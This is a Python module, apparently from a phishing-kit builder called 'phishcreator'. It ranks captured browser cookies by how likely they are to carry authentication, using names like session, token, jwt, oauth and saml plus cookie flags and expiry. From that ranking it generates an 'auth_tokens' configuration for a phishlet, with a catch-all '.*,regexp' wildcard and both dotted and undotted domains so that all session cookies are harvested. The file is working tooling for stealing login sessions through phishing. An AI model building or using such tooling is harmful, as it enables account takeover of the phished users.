#!/usr/bin/env python3
"""
Smart Cookie Analyzer
Intelligently identifies and prioritizes authentication cookies
"""

import re
from typing import Dict, List, Tuple
from dataclasses import dataclass, field
from collections import defaultdict

# Import shared constants
try:
    from phishcreator.modules.constants import (
        COOKIE_PRIORITY_PATTERNS, COOKIE_ATTRIBUTE_SCORES
    )
    CONSTANTS_AVAILABLE = True
except ImportError:
    try:
        from constants import (
            COOKIE_PRIORITY_PATTERNS, COOKIE_ATTRIBUTE_SCORES
        )
        CONSTANTS_AVAILABLE = True
    except ImportError:
        CONSTANTS_AVAILABLE = False
        COOKIE_PRIORITY_PATTERNS = None
        COOKIE_ATTRIBUTE_SCORES = None


@dataclass
class CookieAnalysis:
    """Analysis result for cookies"""
    auth_tokens: List[Dict] = field(default_factory=list)
    critical_cookies: List[str] = field(default_factory=list)
    important_cookies: List[str] = field(default_factory=list)
    optional_cookies: List[str] = field(default_factory=list)
    recommendations: List[str] = field(default_factory=list)


class SmartCookieAnalyzer:
    """
    Analyzes cookies to identify authentication-critical ones
    Uses pattern matching, heuristics, and cookie attributes
    """

    # Fallback patterns if constants module not available
    _DEFAULT_PRIORITY_PATTERNS = {
        'critical': [
            'session', 'token', 'auth', 'jwt', 'oauth', 'access_token',
            'refresh_token', 'bearer', 'saml', 'sso', 'id_token',
            'sessionid', 'session_id', 'sess', 'sid', 'ssid'
        ],
        'important': [
            'login', 'credential', 'identity', 'account', 'user',
            'secure', 'remember', 'persistent', 'logged_in',
            'userid', 'user_id', 'uid', 'accountid'
        ],
        'optional': [
            'csrf', 'xsrf', 'state', 'nonce', 'tracking', 'analytics',
            'preference', 'locale', 'language', 'timezone'
        ]
    }

    _DEFAULT_ATTRIBUTE_SCORES = {
        'httpOnly': 5,      # HttpOnly cookies are often auth-related
        'secure': 3,        # Secure flag indicates sensitive data
        'sameSite_none': 2, # SameSite=None may indicate cross-domain auth
        'long_expiry': 4,   # Long expiry suggests session persistence
        'short_expiry': -2  # Very short expiry might be temporary
    }

    def __init__(self):
        self.cookie_scores = defaultdict(lambda: defaultdict(int))
        self.cookie_metadata = defaultdict(lambda: defaultdict(dict))
        # Use shared constants or fallback to defaults
        self.priority_patterns = COOKIE_PRIORITY_PATTERNS if COOKIE_PRIORITY_PATTERNS else self._DEFAULT_PRIORITY_PATTERNS
        self.attribute_scores = COOKIE_ATTRIBUTE_SCORES if COOKIE_ATTRIBUTE_SCORES else self._DEFAULT_ATTRIBUTE_SCORES
    
    def analyze_cookies(self, cookies_captured: Dict[str, Dict],
                       traffic_data: Dict | None = None) -> CookieAnalysis:
        """
        Analyze captured cookies and generate auth_tokens configuration
        
        Args:
            cookies_captured: Dict of {domain: {cookie_name: cookie_data}}
            traffic_data: Optional traffic analysis data for context
        
        Returns:
            CookieAnalysis object with prioritized cookies
        """
        # Score all cookies
        for domain, cookies in cookies_captured.items():
            for cookie_name, cookie_data in cookies.items():
                score = self._score_cookie(cookie_name, cookie_data, domain)
                self.cookie_scores[domain][cookie_name] = score
                self.cookie_metadata[domain][cookie_name] = cookie_data
        
        # Generate auth_tokens configuration
        auth_tokens = self._generate_auth_tokens(cookies_captured)
        
        # Categorize cookies
        critical_cookies = []
        important_cookies = []
        optional_cookies = []
        
        for domain, cookies in self.cookie_scores.items():
            for cookie_name, score in cookies.items():
                full_name = f"{domain}:{cookie_name}"
                if score >= 10:
                    critical_cookies.append(full_name)
                elif score >= 5:
                    important_cookies.append(full_name)
                else:
                    optional_cookies.append(full_name)
        
        # Generate recommendations
        recommendations = self._generate_recommendations(
            critical_cookies, important_cookies, optional_cookies
        )
        
        return CookieAnalysis(
            auth_tokens=auth_tokens,
            critical_cookies=critical_cookies,
            important_cookies=important_cookies,
            optional_cookies=optional_cookies,
            recommendations=recommendations
        )
    
    def _score_cookie(self, cookie_name: str, cookie_data: Dict, domain: str) -> int:
        """
        Score a cookie based on name patterns and attributes
        
        Returns:
            Integer score (higher = more likely to be auth-related)
        """
        score = 0
        cookie_lower = cookie_name.lower()

        # Score by name pattern
        for priority, patterns in self.priority_patterns.items():
            for pattern in patterns:
                if pattern in cookie_lower:
                    if priority == 'critical':
                        score += 10
                    elif priority == 'important':
                        score += 5
                    elif priority == 'optional':
                        score += 1
                    break

        # Score by attributes
        if cookie_data.get('httpOnly'):
            score += self.attribute_scores['httpOnly']

        if cookie_data.get('secure'):
            score += self.attribute_scores['secure']

        # sameSite can be None in some HAR exports; normalize safely
        same_site = str(cookie_data.get('sameSite', '') or '').lower()
        if same_site == 'none':
            score += self.attribute_scores['sameSite_none']

        # Score by expiry
        # HAR exports vary: expires might be epoch seconds, RFC3339 string, or missing.
        expires_raw = cookie_data.get('expires', 0)
        expires: int = 0
        try:
            if isinstance(expires_raw, (int, float)):
                expires = int(expires_raw)
            elif isinstance(expires_raw, str) and expires_raw.strip().isdigit():
                expires = int(expires_raw.strip())
        except Exception:
            expires = 0

        if expires:
            if expires > 86400 * 30:  # More than 30 days
                score += self.attribute_scores['long_expiry']
            elif expires < 3600:  # Less than 1 hour
                score += self.attribute_scores['short_expiry']
        
        # Bonus for cookies set during authentication
        # (This would require traffic analysis context)
        
        return max(0, score)  # Ensure non-negative
    
    def _generate_auth_tokens(self, cookies_captured: Dict[str, Dict]) -> List[Dict]:
        """
        Generate auth_tokens configuration for phishlet
        
        Returns:
            List of auth_token dictionaries
        """
        auth_tokens = []
        
        # Group cookies by domain
        for domain, cookies in cookies_captured.items():
            # Get all cookie names for this domain
            cookie_names = list(cookies.keys())
            
            # Sort by score (highest first)
            cookie_names.sort(
                key=lambda name: self.cookie_scores[domain][name],
                reverse=True
            )
            
            # Always include wildcard regex as fallback
            if '.*,regexp' not in cookie_names:
                cookie_names.append('.*,regexp')
            
            # Create auth_token entry
            auth_token = {
                'domain': domain,
                'keys': cookie_names
            }
            
            auth_tokens.append(auth_token)
        
        # Also add variations of domains (with and without leading dot)
        additional_tokens = []
        for token in auth_tokens:
            domain = token['domain']
            
            # Add dotted version if not present
            if not domain.startswith('.'):
                dotted_domain = f".{domain}"
                if not any(t['domain'] == dotted_domain for t in auth_tokens):
                    additional_tokens.append({
                        'domain': dotted_domain,
                        'keys': token['keys'].copy()
                    })
            
            # Add non-dotted version if not present
            if domain.startswith('.'):
                non_dotted = domain[1:]
                if not any(t['domain'] == non_dotted for t in auth_tokens):
                    additional_tokens.append({
                        'domain': non_dotted,
                        'keys': token['keys'].copy()
                    })
        
        auth_tokens.extend(additional_tokens)
        
        return auth_tokens
    
    def _generate_recommendations(self, critical: List[str],
                                 important: List[str],
                                 optional: List[str]) -> List[str]:
        """Generate recommendations based on cookie analysis"""
        recommendations = []
        
        if len(critical) == 0:
            recommendations.append(
                "⚠️ No critical authentication cookies detected. "
                "Verify that authentication flow was captured completely."
            )
        else:
            recommendations.append(
                f"✓ Found {len(critical)} critical authentication cookies"
            )
        
        if len(important) > 10:
            recommendations.append(
                f"ℹ️ {len(important)} important cookies detected. "
                "Consider reviewing if all are necessary."
            )
        
        # Check for common auth cookie patterns
        critical_str = ' '.join(critical).lower()
        if 'session' in critical_str:
            recommendations.append("✓ Session-based authentication detected")
        if 'token' in critical_str or 'jwt' in critical_str:
            recommendations.append("✓ Token-based authentication detected")
        if 'oauth' in critical_str:
            recommendations.append("✓ OAuth authentication detected")
        if 'saml' in critical_str:
            recommendations.append("✓ SAML authentication detected")
        
        # Wildcard regex recommendation
        recommendations.append(
            "✓ Wildcard regex (.*,regexp) included as safety net for dynamic cookies"
        )
        
        return recommendations


def analyze_cookies(cookies_captured: Dict[str, Dict],
                   traffic_data: Dict | None = None) -> CookieAnalysis:
    """
    Convenience function to analyze cookies
    
    Args:
        cookies_captured: Dict of captured cookies
        traffic_data: Optional traffic analysis data
    
    Returns:
        CookieAnalysis object
    """
    analyzer = SmartCookieAnalyzer()
    return analyzer.analyze_cookies(cookies_captured, traffic_data)
